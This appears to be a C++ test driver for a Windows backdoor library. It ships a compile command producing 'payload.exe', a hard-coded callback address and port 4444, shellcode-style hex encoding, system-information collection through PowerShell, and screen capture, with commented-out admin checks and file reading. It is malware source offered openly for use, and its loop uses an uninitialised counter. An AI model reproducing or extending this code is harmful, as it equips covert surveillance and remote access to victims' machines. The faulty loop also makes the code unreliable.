// compile Command : g++ backdoorlib.cpp reverse_powershell.cpp -o payload.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -std=c++11 -lwininet


#include "backdoorlib.h"
#include <iostream>
#include <string>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string.h>
#include <wininet.h>
#include <stdio.h>
#include <vector>
#include <sstream>
#include <windows.h>

#pragma comment(lib,"Ws2_32.lib")
#pragma comment(lib,"OleAut32.Lib")

#define REMOTE_ADDR "192.168.1.71"
#define REMOTE_PORT 4444

using namespace std;

int main()
{
    string message = "Hello";
    string thexx = tohex(message);
    int size_thexx = thexx.size();
    string thexx_payload;
    for (int i; i < size_thexx; i++)
    {
        if (i % 2 == 0)
        {
            thexx_payload.append("\\x");
            thexx_payload += thexx[i];
        }
        else {
            thexx_payload += thexx[i];
        }
    }

    cout << thexx << endl;
    cout << thexx_payload << endl;
    string str_shellcode = string_to_shellcode(message);
    cout << str_shellcode << endl;
    //char response_buffer[655556];
    //char *d = cmd_popen_char("powershell.exe -Command Get-ComputerInfo","r",response_buffer);
    //printf("%s\n", d);

    char buffer_return[4096];

    char *dd = get_system_info_by_powershell(buffer_return,GET_WINDOWS_BUILD_LAB_EX);
    cout << dd << endl;

    screenshot(1920, 1080, 0, 0, (LPCSTR)"screenshot.jpg");
    /*BOOL ch_adm = check_admin();
    if (ch_adm == 1)
    {
        cout << "Adminisrator !!!" << endl;
    }
    else {
        cout << "Users !!!!" << endl;
    }

    cout << ch_adm << endl;
    //printf("Assembleur");
    //asm(".byte 0x90,0x90,0x90,0x61\n\tret\n\t");
    string buffer_return;
    /*string buffer;
    ifstream infile;
    infile.open("test.exe",ios::binary);
    while (!infile.eof())
    {
        getline(infile,buffer);
        buffer_return.append(buffer);
        buffer_return.append("\n");
    }
    infile.close();
    cout << buffer_return << endl; */
    /*string rd = read_file("test_lib.cpp",buffer_return);
    cout << rd << endl;
    buffer_return.clear();
    buffer_return = "";
    //string rdb = read_file_binary("test.exe",buffer_return);
    //cout << rdb << endl;
    //buffer_return = "";
    string rdh = read_file_binary_to_hex("test.exe",buffer_return);
    cout << rdh << endl; */


    return 0;
}